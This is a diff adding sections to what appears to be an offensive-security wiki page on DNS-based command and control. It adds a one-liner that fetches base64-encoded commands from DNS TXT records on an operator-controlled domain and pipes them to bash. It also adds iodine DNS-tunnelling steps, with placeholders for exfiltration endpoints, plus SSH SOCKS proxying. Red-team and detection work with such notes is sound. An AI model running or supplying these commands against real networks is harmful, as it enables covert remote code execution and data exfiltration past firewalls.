@@ -39,7 +39,40 @@ The DNS protocol is allowed in almost all firewalls in any organization network 
 
 ## C2 Communications over DNS 
 
-For a listing of modern C2 see the [[C2-Matrix]] and [[Introduction-To-Comand-And-Control-Frameworks]] if you require some basic understanding regard fundementals of what a C2 is.
+For a listing of modern C2 see the [[C2-Matrix]] and [[Introduction-To-Comand-And-Control-Frameworks]] if you require some basic understanding regard fundementals of what a C2 is. Some C2 use DNS for communication and also use TXT DNS record to run a droppers to download files.
+
+```bash
+# $command-in-txt-records.domain.com
+# C2 agent would request the TXT content to then format and decode it 
+dig +short -t TXT $command-in-txt-records.$domain.com | tr -d "\"" | base64 -d | bash
+```
+
+## DNS Tunneling (TCPoverDNS)
+
+DNS tunneling is a technique of encapsulating other protocols over the DNS protocol, this commuication chanell must be established one both ends of the tunnel. [iodine](https://github.com/yarrick/iodine) is a DNS tunnel written in C that can let you tunel IPv4 data through a DNS server.
+
+ To establish a DNS tunnel:
+ 1. Update DNS records, creating a new NS pointing to `$exfiltrate-to-location`
+ 2. Run `iodined` server from `$exfiltrate-to-location`
+ 3. Run `iodine` (no `d` in the iodine client) client from `$exfiltrate-from-location`
+ 4. SSH to `fill` on create network interface to create a proxy over DNS with `-D` flag to create dynamic port forwarding
+
+WE can then use local IP, port as proxy in Firefox or Proxychains
+```bash
+# Create a new network interface dns0
+# -f: foreground, -c: skip checking client IP for each DNS request, -P set password
+# $IP/CIDR is set to network IP for the dns0; this is the addressing of dns0!
+# I.e server will be 10.1.1.1 if $IP/$CIDR = 10.1.1.1/24 ; client will be 10.1.1.2
+# Then provide a nameserver
+sudo iodined -f -c -P <password> $IP/$CIDR $ns.$domain.com  
+# Client to server:
+sudo iodine -P $password $ns.$domain.com 
+# Create dynamic port forward
+ssh $user@10.1.1.2 -4 -f -N -D 1080
+proxychains curl http://$ip/
+# OR
+curl --socks5 127.0.0.1:1080 http://$ip/
+```
 
 
 ## References
